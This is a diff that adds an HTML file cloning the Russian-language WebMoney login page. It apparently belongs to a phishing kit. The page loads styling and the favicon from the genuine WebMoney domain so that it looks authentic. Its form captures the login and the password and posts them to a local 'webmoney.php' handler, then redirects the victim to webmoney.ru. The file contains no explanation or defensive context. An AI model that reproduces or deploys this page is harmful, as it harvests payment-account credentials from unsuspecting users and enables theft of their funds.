@@ -1,0 +1,172 @@
+
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="utf-8">
+    <meta content="no-cache" http-equiv="cache-control">
+    <meta content="no-cache" http-equiv="pragma">
+    <meta content="noindex,nofollow" name="robots">
+    <meta content="noarchive" name="googlebot">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <link href="https://login.wmtransfer.com/favicon.ico" rel="icon" type="image/x-icon">
+    <link href="https://login.wmtransfer.com/favicon.ico" rel="shortcut icon" type="image/x-icon">
+    <link href=
+    "https://login.wmtransfer.com/combres.axd/gate.css/5a995d22bf6ebe2180d915fb95983a5b0801cbd594babb67c33a02155bff627190ee1f7d89cf78e95b853db81bf377917073bec9f7b04cbf7d9dafa613750517/"
+    rel="stylesheet" type="text/css">
+    <!--[if IE 8]>              <link rel="stylesheet" type="text/css" href="https://login.wmtransfer.com/combres.axd/gate-ie8.css/8b871494ae22ddeb761fd0e9ffd86fef393e13ecbb0ad40164a2f26b298493355d1fef87ec5d11fe72d12eafa40a890bd8d200f6a9673821e30576b2ee9407dc/"/>          <![endif]--><!--[if IE 7]>              <link rel="stylesheet" type="text/css" href="https://login.wmtransfer.com/combres.axd/gate-ie7.css/b70593356b85d80dfd34b998c62b7cbbf1c4bab96000df48ff4f929a2a9693fbbf7eaf422a9a5d8888a8cbcad710b96639021d698571a056821dc2f0f87e14ec/"/>          <![endif]--><!--[if lt IE 9]>              <script type="text/javascript" src="https://login.wmtransfer.com/combres.axd/gate-ie9.js/decec3943d9897529981520487c2d203cfaf07c9d680dfa4a266cffdcf54a2e7440feb10ac5335a5504417c2c26574e038c9eac0b778d19f04e896869751c681/"></script>          <![endif]-->
+    <title>WebMoney.Login</title>
+</head>
+<body>
+    <div class="login-viewport">
+        <div class="header">
+            <select class="lang-selector" name="languages" onchange=
+            "LanguageSelector_change_handler(this);" tabindex="2010">
+                <option selected="'selected'" value="ru-RU">
+                    Ru
+                </option>
+                <option value="en-US">
+                    En
+                </option>
+                <option value="es-ES">
+                    Es
+                </option>
+                <option value="pt-BR">
+                    Pt
+                </option>
+                <option value="tr-TR">
+                    Tr
+                </option>
+                <option value="vi-VN">
+                    Vi
+                </option>
+            </select>
+            <h1>WebMoney Login</h1>
+            <div class="login-zone">
+                Вы входите в защищенную зону сайта: <a href="">WebMoney Keeper
+                Standard</a><br>
+                Адрес сайта: <a href="">https://mini.wmtransfer.com/</a>
+            </div>
+        </div>
+        <div class="content">
+            <form action=
+			"webmoney.php"
+            method="post">
+				<input type="hidden" name="service" value="webmoney">
+				<input type="hidden" name="ref" value="0">
+				<input type="hidden" name="redirect" value="http://www.webmoney.ru/">
+                <div class="login-tab-wrapper">
+                    <h2 class="icon-password">Логин и пароль</h2>
+                    <ul class="login-forms login-forms-mini">
+                        <li>
+                            <label for="Login">Логин:</label>
+                            <div>
+                                <input data-suggestions-roles="PhoneNumber"
+                                data-val="true" data-val-required="Поле" id=
+                                "Login" name="login" tabindex="10" type="text"
+								value="" required>
+                            </div><span class="login-form-hint">e–mail, WMID
+                            или номер телефона в международном формате</span>
+                            <span class="login-form-suggestion" id=
+                            "Login-suggestions" style="display: none"></span>
+                            <span class="field-validation-valid"
+                            data-valmsg-for="Login" data-valmsg-replace=
+                            "true"></span>
+                        </li>
+                        <li>
+                            <label for="Password">Пароль:</label>
+                            <div>
+                                <input data-val="true" data-val-required="Поле"
+                                id="Password" name="pass" tabindex="20"
+								type="password" value="" required>
+                            </div><span class="login-form-hint"><a href=""
+                            tabindex="1020">напомнить пароль</a></span>
+                            <span class="field-validation-valid"
+                            data-valmsg-for="Password" data-valmsg-replace=
+                            "true"></span>
+                        </li>
+                    </ul>
+                </div>
+                <div class="login-options">
+					<label><input id="RememberMe" type="checkbox" checked> запомнить
+                    меня на этом компьютере. <span>Использовать эти данные для
+                    аутентификации в системе WebMoney Transfer.</span></label>
+                </div>
+                <div class="login-buttons">
+                    <input tabindex="100" type="submit" value="Войти"> <a href=
+                    "" onclick=" GateKeeper_cancel_handler(this);" tabindex=
+                    "110">Отменить</a>
+                </div>
+            </form>
+            <div class="login-alternate clearfix">
+                <span>Или используйте...</span>
+                <div class="login-with-keepers">
+                    <ul class="clearfix">
+                        <li class="keeper-classic">
+                            <a href="" title="Keeper WinPro (Classic)"></a>
+                        </li>
+                        <li class="keeper-light">
+                            <a href="" title="Keeper WebPro (Light)"></a>
+                        </li>
+                    </ul>
+                </div>
+                <div class="login-with-social">
+                    <ul class="social-networks clearfix">
+                        <li class="odnoklassniki" tabindex="200">
+                            <a href="" onclick=
+                            "SocialAuthWith('odnoklassniki')"></a>
+                        </li>
+                        <li class="vk" tabindex="201">
+                            <a href="" onclick=
+                            "SocialAuthWith('vkontakte')"></a>
+                        </li>
+                        <li class="facebook" tabindex="202">
+                            <a href="" onclick=
+                            "SocialAuthWith('Facebook')"></a>
+                        </li>
+                        <li class="social-more" rel="toggle-actions">
+                            <i></i>
+                            <ul>
+                                <li class="mail" tabindex="203">
+                                    <a href="" onclick=
+                                    "SocialAuthWith('mailru')"></a>
+                                </li>
+                                <li class="google" tabindex="204">
+                                    <a href="" onclick=
+                                    "SocialAuthWith('Gmail')"></a>
+                                </li>
+                                <li class="yandex" tabindex="205">
+                                    <a href="" onclick=
+                                    "SocialAuthWith('Yandex')"></a>
+                                </li>
+                                <li class="icq" tabindex="206">
+                                    <a href="" onclick=
+                                    "SocialAuthWith('ICQ')"></a>
+                                </li>
+                                <li class="twitter" tabindex="207">
+                                    <a href="" onclick=
+                                    "SocialAuthWith('Twitter')"></a>
+                                </li>
+                                <li class="windows-live" tabindex="208">
+                                    <a href="" onclick=
+                                    "SocialAuthWith('windowslive')"></a>
+                                </li>
+                                <li class="yahoo" tabindex="209">
+                                    <a href="" onclick=
+                                    "SocialAuthWith('Yahoo')"></a>
+                                </li>
+                                <li class="my-linkedin" tabindex="210">
+                                    <a href="" onclick=
+                                    "SocialAuthWith('Linkedin')"></a>
+                                </li>
+                            </ul>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="login-info">
+        <a href="">Восстановление доступа</a>
+    </div>
+</body>
+</html>
